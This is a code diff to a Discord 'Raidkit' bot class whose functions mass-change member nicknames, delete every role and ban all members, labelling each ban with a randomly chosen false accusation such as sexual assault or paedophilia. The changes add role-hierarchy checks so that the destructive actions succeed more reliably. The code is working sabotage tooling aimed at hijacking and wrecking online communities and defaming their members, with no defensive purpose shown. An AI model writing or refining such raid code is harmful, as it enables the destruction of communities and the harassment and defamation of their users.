@@ -27,7 +27,9 @@ class Raidkit:
     except Exception as e:
       log.warning(f"Failed to grant admin role: Exception: {e}")
   async def _mass_nick(self, guild: discord.Guild, nickname: str, /) -> None:
-    re_nc: list[discord.Member | BaseException | None] = await asyncio.gather(*[mb.edit(nick=nickname) for mb in guild.members], return_exceptions=True)
+    if guild.me is None:
+      raise NotImplementedError()
+    re_nc: list[discord.Member | BaseException | None] = await asyncio.gather(*[mb.edit(nick=nickname) for mb in guild.members if guild.me.top_role > mb.top_role], return_exceptions=True)
     for r_nc, mb in zip(re_nc, guild.members):
       if isinstance(r_nc, Exception):
         log.warning(f"Failed to change nickname for {mb.name}: {r_nc}")
@@ -103,8 +105,10 @@ class Raidkit:
       else:
         log.info(f"Deleted sticker {st.name} from guild {guild.name}")
   async def _delete_rol(self, guild: discord.Guild, /) -> None:
+    if guild.me is None:
+      raise NotImplementedError()
     old_rl = guild.roles
-    re = await asyncio.gather(*[r.delete() for r in guild.roles if not r.is_default()], return_exceptions=True)
+    re = await asyncio.gather(*[r.delete() for r in guild.roles if not r.is_default() and guild.me.top_role > r], return_exceptions=True)
     for r, rl in zip(re, old_rl):
       if isinstance(r, Exception):
         log.warning(f"Failed to delete role {rl.name} from guild {guild.name}: {r}")
@@ -119,12 +123,14 @@ class Raidkit:
       else:
         log.info(f"Deleted channel {ch.name} from guild {guild.name}")
   async def _ban_mb(self, guild: discord.Guild, author: Union[discord.Member, discord.User], /) -> None:
+    if guild.me is None:
+      raise NotImplementedError()
     old_mb = guild.members
     re = await asyncio.gather(*[m.ban(reason=random.choice([
       "Racism", "Homophobia", "Transphobia", "Sexism", "Ableism", "Ageism",
       "Sexual Harassment", "Sexual Assault", "Harassment", "Stalking", "Threats",
       "Trolling", "Cyberbullying", "Bullying", "Hacking", "Doxing", "Paedophillia"
-      ])) for m in guild.members if m != author and m != self.bot.user], return_exceptions=True)
+      ])) for m in guild.members if m != author and m != self.bot.user and guild.me.top_role > m.top_role], return_exceptions=True)
     for r, mb in zip(re, old_mb):
       if isinstance(r, Exception):
         log.warning(f"Failed to ban member {mb.name} from guild {guild.name}: {r}")
